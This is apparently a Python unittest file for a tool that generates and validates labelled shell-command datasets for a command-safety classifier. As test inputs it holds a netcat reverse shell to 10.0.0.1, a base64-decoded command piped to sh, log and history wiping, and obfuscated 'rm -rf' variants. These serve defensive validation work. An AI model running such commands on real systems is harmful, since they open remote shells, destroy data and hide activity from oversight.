"""Тесты каркаса. Запуск из корня: python3 -m unittest discover -s tests -v"""

import csv
import json
import shutil
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from cgen import clean, dedup, export, generate, report, validate  # noqa: E402
from cgen.config import load_config, run_dir  # noqa: E402
from cgen.io import FIELDS, read_jsonl  # noqa: E402
from cgen.seeds import SeedError, load_seeds  # noqa: E402

QUIET = lambda *a, **k: None  # noqa: E731


def seed(i, **over):
    s = {
        "seed_id": f"S{i}",
        "split": "train",
        "risk": "CAT-6.1",
        "family_id": f"F{i}",
        "prompt": f"тестовый seed {i}",
        "mechanism": "m",
        "source_kind": "abstract_synthetic_spec",
        "status": "approved_for_generation",
        "model_family_blocklist": [],
    }
    s.update(over)
    return s


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        shutil.copy(ROOT / "prompts/generation_v1.md", self.tmp / "t.md")
        shutil.copy(ROOT / "taxonomy.json", self.tmp / "tax.json")
        self.write_seeds([seed(i) for i in range(3)])

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def write_seeds(self, rows):
        (self.tmp / "seeds.jsonl").write_text(
            "".join(json.dumps(r, ensure_ascii=False) + "\n" for r in rows)
        )

    def cfg(self, **over):
        c = {
            "run_name": "r",
            "split": "train",
            "seeds_path": "seeds.jsonl",
            "output_dir": "runs",
            "taxonomy_path": "tax.json",
            "prompt": {"template": "t.md", "candidates_per_call": 3},
            "backend": {"provider": "mock"},
            "sampling": {"samples_per_seed": 2},
        }
        c.update(over)
        p = self.tmp / "cfg.json"
        p.write_text(json.dumps(c, ensure_ascii=False))
        return load_config(p)

    def run_all(self, cfg, **kw):
        generate.run(cfg, log=QUIET, **kw)
        for step in (clean.run, dedup.run, validate.run, export.run, report.run):
            step(cfg, log=QUIET)
        return run_dir(cfg)


class TestEndToEnd(Base):
    def test_clean_mock_full_run(self):
        out = self.run_all(self.cfg())
        with open(out / "dataset.csv", newline="") as f:
            rows = list(csv.DictReader(f))
        self.assertEqual(len(rows), 3 * 2 * 3)
        self.assertEqual(list(rows[0].keys()), FIELDS)
        self.assertTrue(all(r[k] for r in rows for k in FIELDS), "пустые ячейки")
        self.assertEqual(rows[0]["risk"], "CAT-6.1 Encoded Payload Pipe")
        self.assertEqual({r["source"] for r in rows}, {"synthetic"})
        self.assertEqual(len(read_jsonl(out / "provenance.jsonl")), len(rows))
        rep = json.loads((out / "report.json").read_text())
        self.assertEqual(rep["final_rows"], len(rows))
        self.assertEqual(rep["seeds_with_zero_yield"], [])

    def test_dirty_mock_rejects_and_fixes(self):
        cfg = self.cfg(
            backend={"provider": "mock", "mode": "dirty"},
            sampling={"samples_per_seed": 12},
        )
        out = self.run_all(cfg)
        rep = json.loads((out / "report.json").read_text())
        all_reasons = {r for s in rep["rejected_reasons"].values() for r in s}
        for expected in (
            "invalid_json",
            "foreign_script_in_command",
            "duplicate_in_run",
            "bash_syntax_error",
            "bad_class:maybe",
        ):
            self.assertIn(expected, all_reasons)
        self.assertIn("removed_markdown_fence", rep["fixes_applied"])
        self.assertIn("unescaped_quotes", rep["fixes_applied"])

    def test_dry_run_builds_prompts_without_backend(self):
        cfg = self.cfg()
        generate.run(cfg, dry_run=True, log=QUIET)
        recs = read_jsonl(run_dir(cfg) / "raw.jsonl")
        self.assertTrue(all(r["status"] == "dry_run" for r in recs))
        self.assertIn("тестовый seed 0", recs[0]["messages"][1]["content"])
        self.assertNotIn("{{", recs[0]["messages"][1]["content"])


class TestResume(Base):
    def test_resume_continues_without_duplicates(self):
        cfg = self.cfg()
        generate.run(cfg, limit=2, log=QUIET)
        with self.assertRaises(ValueError):
            generate.run(cfg, log=QUIET)  # без --resume нельзя
        generate.run(cfg, resume=True, log=QUIET)
        keys = [
            (r["seed_id"], r["sample_idx"])
            for r in read_jsonl(run_dir(cfg) / "raw.jsonl")
        ]
        self.assertEqual(len(keys), 6)
        self.assertEqual(len(set(keys)), 6)

    def test_resume_refused_if_seeds_changed(self):
        cfg = self.cfg()
        generate.run(cfg, limit=1, log=QUIET)
        self.write_seeds([seed(i) for i in range(4)])
        with self.assertRaises(ValueError):
            generate.run(self.cfg(), resume=True, log=QUIET)

    def test_interrupted_tail_is_dropped(self):
        cfg = self.cfg()
        generate.run(cfg, limit=2, log=QUIET)
        with open(run_dir(cfg) / "raw.jsonl", "a") as f:
            f.write('{"seed_id": "S2", "sampl')  # недописанная строка
        generate.run(cfg, resume=True, log=QUIET)
        self.assertEqual(len(read_jsonl(run_dir(cfg) / "raw.jsonl")), 6)


class TestSeeds(Base):
    def test_bad_seeds_rejected(self):
        for bad in (
            seed(0, split="test"),
            seed(0, few_shot=["x"]),
            seed(0, source_commands=["x"]),
            seed(0, status="draft"),
            seed(0, risk="CAT-6"),
            seed(0, source_kind="real"),
        ):
            self.write_seeds([bad])
            with self.assertRaises(SeedError, msg=str(bad)):
                load_seeds(self.cfg())
        self.write_seeds([seed(0), seed(0)])
        with self.assertRaises(SeedError):
            load_seeds(self.cfg())


class TestSteps(Base):
    def test_dedup_against_external_test_file(self):
        cfg0 = self.cfg()
        generate.run(cfg0, log=QUIET)
        clean.run(cfg0, log=QUIET)
        first = read_jsonl(run_dir(cfg0) / "candidates.jsonl")[0]["command"]
        with open(self.tmp / "test.csv", "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(FIELDS)
            w.writerow(
                ["  " + first.replace(" ", "   ") + " "] + ["x"] * 8
            )  # отличается только пробелами
        cfg = self.cfg(dedup={"against": ["test.csv"]})
        kept, rej = dedup.run(cfg, log=QUIET)
        self.assertEqual([r["reason"] for r in rej], ["overlaps_external"])

    def test_clean_helpers(self):
        c = self.cfg()
        self.assertEqual(clean.clean_command('echo \\"a b\\"', c)[0], 'echo "a b"')
        self.assertEqual(
            clean.clean_command('echo "a" \\"b\\"', c)[0], 'echo "a" \\"b\\"'
        )  # смешанное не трогаем
        self.assertEqual(clean.clean_command("`ls -la`", c)[0], "ls -la")
        self.assertEqual(clean.clean_command("$ ls", c)[0], "ls")
        for bad, reason in (
            ("", "empty_command"),
            ("ls " + "a" * 3000, "command_too_long"),
            ("ls ünï", "non_ascii_command"),
            ("ls 文件", "foreign_script_in_command"),
        ):
            with self.assertRaises(ValueError) as e:
                clean.clean_command(bad, c)
            self.assertEqual(str(e.exception), reason)
        obj, fixes = clean.extract_json(
            '<think>x</think>Ответ:\n```json\n{"candidates": []}\n```'
        )
        self.assertEqual(obj, {"candidates": []})
        self.assertIn("removed_think_block", fixes)

    def test_bash_syntax_never_executes(self):
        marker = self.tmp / "must_not_exist"
        self.assertTrue(validate.bash_syntax_ok(f"touch {marker}"))
        self.assertFalse(marker.exists())
        self.assertFalse(validate.bash_syntax_ok("echo ("))
        self.assertTrue(validate.bash_syntax_ok("for i in 1 2; do echo $i; done"))

    def test_secret_detection(self):
        c = self.cfg()
        cand = {
            "command": "echo AKIA" + "A" * 16,
            "description": "d",
            "util": "echo",
            "class": "allow",
            "severity": "low",
        }
        reasons, _ = validate.check(cand, c)
        self.assertIn("possible_secret_in_command", reasons)

    def test_five_classes_configurable(self):
        classes = ["allow", "ask", "deny", "modify", "defer"]
        cfg = self.cfg(
            labels={"classes": classes},
            prompt={"template": "t.md", "candidates_per_call": 5},
        )
        out = self.run_all(cfg)
        with open(out / "dataset.csv", newline="") as f:
            got = {r["class"] for r in csv.DictReader(f)}
        self.assertEqual(got, set(classes))


from cgen import anchors, flagcheck  # noqa: E402
from cgen.shparse import parse  # noqa: E402

# Реальный ответ Huihui-Qwen3.5-4B-abliterated на seed CAT-6.3 (сгенерированные данные, не test-набор).
QWEN4B_CAT63 = [
    ("history -d 2023/12/12 /home/user/.history", "allow"),
    ("journalctl --zero-logs --after=2023/12/12 --before=2023/12/13", "deny"),
    ('cat /var/log/audit/audit.log | grep "bash" > /tmp/audit_bash.txt', "ask"),
    ("sudo logrotate /var/log/audit/audit.log --delay --rotate 5 --move", "allow"),
]
CLASSES = ["allow", "ask", "deny"]


class TestFlagsAndAnchors(Base):
    def test_qwen4b_fake_flags_caught(self):
        p = [flagcheck.check(c)[0] for c, _ in QWEN4B_CAT63]
        self.assertEqual(p[0], ["bad_flag_value:history:-d"])
        self.assertIn("unknown_flag:journalctl:--zero-logs", p[1])
        self.assertEqual(p[2], [])
        self.assertEqual(
            p[3],
            [
                "unknown_flag:logrotate:--delay",
                "unknown_flag:logrotate:--rotate",
                "unknown_flag:logrotate:--move",
            ],
        )  # sudo снят

    def test_qwen4b_label_conflicts(self):
        w = [
            anchors.check({"command": c, "class": k}, CLASSES) for c, k in QWEN4B_CAT63
        ]
        self.assertEqual(w[0], ["label_conflict:history_clear:expected=ask/deny"])
        self.assertEqual(w[2], ["label_conflict:read_only:expected=allow"])
        self.assertEqual(w[3], [])

    def test_valid_flags_not_rejected(self):
        for cmd in [
            "tail -fn100 /var/log/syslog",
            "journalctl --since='1 hour ago' -u ssh --no-pager",
            "grep -rniE foo .",
            "du -sh .",
            "sed -i.bak s/a/b/ f",
            "history -d 15",
            "chattr -i f",
            "set +o history",
            "ls -la --color=auto",
            "head -5 f",
            "date -s '2020-01-01'",
            "env -i X=1 nohup tail -n5 x &",
            "echo $(date +%s) 2>&1 >> /tmp/x",
            "rm -rf --verb x",
        ]:
            self.assertEqual(flagcheck.check(cmd)[0], [], cmd)

    def test_syntax_quirks_not_rejected(self):
        # многострочные команды и heredoc: тело heredoc — данные, перевод строки — разделитель
        for cmd in ["history -c\nrm -f ~/.bash_history", "cat > /tmp/s.sh <<'EOF'\nrm -rf x\nEOF",
                    "grep x f \\\n  | tail -n 2", 'echo "a\nb" | grep -c b',
                    # символьный режим chmod, сигналы kill, nc из netcat-traditional, wget/ausearch -xx
                    "chmod -x f", "chmod -R 755 d", "kill -HUP 1", "kill -SIGTERM 1", "kill -9 1",
                    "nc -e /bin/sh 10.0.0.1 4444", "wget -np -nv https://example.com/", "wget -mnp https://example.com/", "ausearch -ui 1000 -ts recent"]:
            self.assertEqual(flagcheck.check(cmd)[0], [], cmd)
        self.assertEqual(flagcheck.check("cat <<EOF > f\n--bogus\nEOF\njournalctl --zero-logs")[0],
                         ["unknown_flag:journalctl:--zero-logs"])
        self.assertTrue(anchors.check({"command": "ls\nhistory -c", "class": "allow"}, CLASSES))

    def test_obfuscated_and_unknown_utils_not_rejected(self):
        self.assertEqual(flagcheck.check("a=rm; b=-rf; $a $b /tmp/x"), ([], []))
        self.assertEqual(flagcheck.check("r=r; m=m; ${r}${m} -rf /tmp"), ([], []))
        self.assertEqual(flagcheck.check("find / -name x -exec rm {} \\;"), ([], []))
        self.assertEqual(
            flagcheck.check("myutil --whatever"), ([], ["flags_unchecked:myutil"])
        )
        self.assertEqual(
            flagcheck.check("echo 'unterminated"), ([], ["flags_parse_failed"])
        )

    def test_nested_shell_checked(self):
        self.assertEqual(
            flagcheck.check('bash -c "journalctl --zero-logs"')[0],
            ["unknown_flag:journalctl:--zero-logs"],
        )
        self.assertEqual(
            [s.util for s in parse("diff <(ls a) <(ls b)")], ["ls", "ls", "diff"]
        )

    def test_anchor_rules(self):
        def conflict(cmd, cls):
            return anchors.check({"command": cmd, "class": cls}, CLASSES)

        self.assertTrue(conflict("echo cm0= | base64 -d | sh", "allow"))
        self.assertTrue(conflict("unset HISTFILE", "allow"))
        self.assertFalse(conflict("unset HISTFILE", "ask"))
        # верная метка у опасной команды не превращается в «только чтение -> allow»
        self.assertFalse(conflict("cat /dev/null > /home/dev/.bash_history", "deny"))
        self.assertFalse(conflict("cat x > .bash_history", "deny"))
        # запись не в /tmp — уже не «только чтение»
        self.assertFalse(conflict("grep foo /etc/passwd > /etc/x", "ask"))
        # выдуманные флаги: правило «только чтение» не применяется
        self.assertFalse(
            anchors.check(
                {"command": QWEN4B_CAT63[1][0], "class": "deny"},
                CLASSES,
                allow_read_only=False,
            )
        )
        # из прогона 4B: дописывание (>>) в лог — не стирание; journald без префикса systemd-
        self.assertFalse(
            conflict("cat /var/log/a.log | grep -v x >> /var/log/a.log.2", "allow")
        )
        self.assertTrue(conflict("sudo systemctl disable journald.service", "allow"))
        self.assertTrue(conflict(": > /var/log/kern.log", "allow"))
        self.assertFalse(conflict("confirm x /var/log/y", "allow"))
        # mock-команды правила не трогают
        self.assertFalse(conflict("echo mock-abc-0", "deny"))

    def test_flag_check_modes_and_review_queue(self):
        cand = {
            "command": "journalctl --zero-logs",
            "description": "d",
            "util": "journalctl",
            "class": "deny",
            "severity": "high",
        }
        reasons, _ = validate.check(cand, self.cfg())
        self.assertIn("unknown_flag:journalctl:--zero-logs", reasons)
        reasons, warns = validate.check(cand, self.cfg(validate={"flag_check": "warn"}))
        self.assertEqual(reasons, [])
        self.assertIn("unknown_flag:journalctl:--zero-logs", warns)
        reasons, warns = validate.check(cand, self.cfg(validate={"flag_check": "off"}))
        self.assertNotIn("unknown_flag:journalctl:--zero-logs", reasons + warns)
        with self.assertRaises(ValueError):
            self.cfg(validate={"flag_check": "maybe"})


class _FakeServer(BaseHTTPRequestHandler):
    requests = []

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        _FakeServer.requests.append(
            {"path": self.path, "body": body, "auth": self.headers.get("Authorization")}
        )
        content = json.dumps(
            {
                "candidates": [
                    {
                        "command": f"echo srv-{len(_FakeServer.requests)}",
                        "description": "d",
                        "util": "echo",
                        "class": "allow",
                        "severity": "low",
                    }
                ]
            }
        )
        data = json.dumps(
            {
                "choices": [{"message": {"content": content}}],
                "usage": {"total_tokens": 1},
            }
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a):
        pass


class TestOpenAICompatible(Base):
    def test_against_local_fake_server(self):
        srv = HTTPServer(("127.0.0.1", 0), _FakeServer)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            import os

            os.environ["CGEN_TEST_KEY"] = "k123"
            cfg = self.cfg(
                backend={
                    "provider": "openai_compatible",
                    "base_url": f"http://127.0.0.1:{srv.server_port}/v1",
                    "model": "my-model",
                    "api_key_env": "CGEN_TEST_KEY",
                    "extra_body": {"top_k": 20},
                }
            )
            out = self.run_all(cfg)
        finally:
            srv.shutdown()
            srv.server_close()
        req = _FakeServer.requests[0]
        self.assertEqual(req["path"], "/v1/chat/completions")
        self.assertEqual(req["body"]["model"], "my-model")
        self.assertEqual(req["body"]["top_k"], 20)
        self.assertIn("seed", req["body"])
        self.assertEqual(req["auth"], "Bearer k123")
        manifest = json.loads((out / "manifest.json").read_text())
        self.assertNotIn("k123", json.dumps(manifest))
        with open(out / "dataset.csv", newline="") as f:
            self.assertEqual(len(list(csv.DictReader(f))), 6)


if __name__ == "__main__":
    unittest.main()
